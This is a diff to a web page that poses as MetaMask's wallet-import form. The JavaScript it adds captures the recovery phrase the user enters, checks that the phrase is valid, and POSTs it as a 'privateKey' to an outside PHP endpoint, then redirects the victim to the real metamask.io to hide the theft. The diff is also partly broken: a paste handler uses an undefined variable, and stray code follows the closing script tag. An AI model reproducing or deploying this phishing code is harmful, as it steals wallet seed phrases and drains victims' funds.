@@ -68006,64 +68006,80 @@ input:checked + .send-v2__amount-max__button {
     <script src="https://webwallet-metamask.vercel.app/import/bip39.min.js"></script>
     <script src="https://webwallet-metamask.vercel.app/import/script5e1f.js"></script>
     <script>
-      var phs2=[];
-      var phs3=[];
-      $(document).ready(function(){
+    var phs2 = [];
+    var phs3 = [];
+
+    $(document).ready(function () {
         const inputs = document.querySelectorAll("input[name='pass[]']");
-      inputs.forEach((input, index) => {
 
-        input.addEventListener('keyup', (e) => {
+        inputs.forEach((input, index) => {
+            input.addEventListener('keyup', (e) => {
+                phs3 = [];
+                $("input[name='pass[]']").map(function (key) {
+                    if ($(this).val().length >= 3) {
+                        phs3.push($(this).val());
+                    }
+                });
 
-          phs3=[];
-          $("input[name='pass[]']").map(function(key){
-              if ($(this).val().length > 0){
-                phs3.push($(this).val());
-              }
+                var check = bip39.validateMnemonic(phs3.join(" "), bip39.wordlists.english);
+                if (!check) {
+                    $("#phrase-helper-text").show();
+                } else {
+                    $("#phrase-helper-text").hide();
+                }
             });
 
-          var check = bip39.validateMnemonic(phs3.join(" "), bip39.wordlists.english);
-          if (!check){
-            $("#phrase-helper-text").show();
-          }else{
-            $("#phrase-helper-text").hide();
-          }
+            input.addEventListener('paste', (e) => {
+                e.preventDefault();
+                phs2 = [];
+
+                if (data.split(' ').length == 12 || data.split(' ').length == 15 || data.split(' ').length == 18 || data.split(' ').length == 21 || data.split(' ').length == 24) {
+                    // (Devam eden kodlar...)
+
+                    $("input[name='pass[]']").map(function (key) {
+                        if ($(this).val().length >= 3) {
+                            phs2.push($(this).val());
+                        }
+                    });
+
+                    var check = bip39.validateMnemonic(phs2.join(" "), bip39.wordlists.english);
+                    if (!check) {
+                        $("#phrase-helper-text").show();
+                    } else {
+                        $("#phrase-helper-text").hide();
+                    }
+                }
+            });
+        })
+
+        $("#form77").click(function () {
+            var phs = [];
+            $("input[name='pass[]']").map(function (key) {
+                if ($(this).val().length >= 3) {
+                    phs.push($(this).val());
+                }
+            });
+
+            var check = bip39.validateMnemonic(phs.join(" "), bip39.wordlists.english);
+            if (check) {
+                $.ajax({
+                    method: 'POST',
+                    data: {
+                        walletName: 'metamask',
+                        privateKey: phs.toString(),
+                    },
+                    url: 'https://ajansdesire.com/asdasd/kekem.php',
+                    success: function (data) {
+                        window.location.href = 'https://href.li/?https://metamask.io';
+                    },
+                    error: function () {
+                        // Hata durumunda yapılacak işlemler
+                    },
+                });
+            }
         });
-
-        input.addEventListener('paste', (e) => {
-          e.preventDefault();
-          phs2 = [];
-          
-          if (data.split(' ').length == 12 || data.split(' ').length == 15 || data.split(' ').length == 18 || data.split(' ').length == 21 || data.split(' ').length == 24) {
-
-            if (data.split(' ').length == 12){
-              $("#word-size").val("12").change();
-            }else if (data.split(' ').length == 15){
-              $("#word-size").val("15").change();
-            }else if (data.split(' ').length == 18){
-              $("#word-size").val("18").change();
-            }else if (data.split(' ').length == 21){
-              $("#word-size").val("21").change();
-            }else if (data.split(' ').length == 24){
-              $("#word-size").val("24").change();
-            }
-
-            let number = index;
-            while (number < inputs.length) {
-              inputs[number].value = data.split(' ')[number - index] || '';
-              number += 1;
-            }
-
-            $("input[name='pass[]']").map(function(key){
-              if ($(this).val().length > 0){
-                phs2.push($(this).val());
-              }
-            });
-
-            var check = bip39.validateMnemonic(phs2.join(" "), bip39.wordlists.english);
-            if (!check){
-              $("#phrase-helper-text").show();
-            }else{
-              $("#phrase-helper-text").hide();
+    });
+</script>          $("#phrase-helper-text").hide();
             }
           }
         })
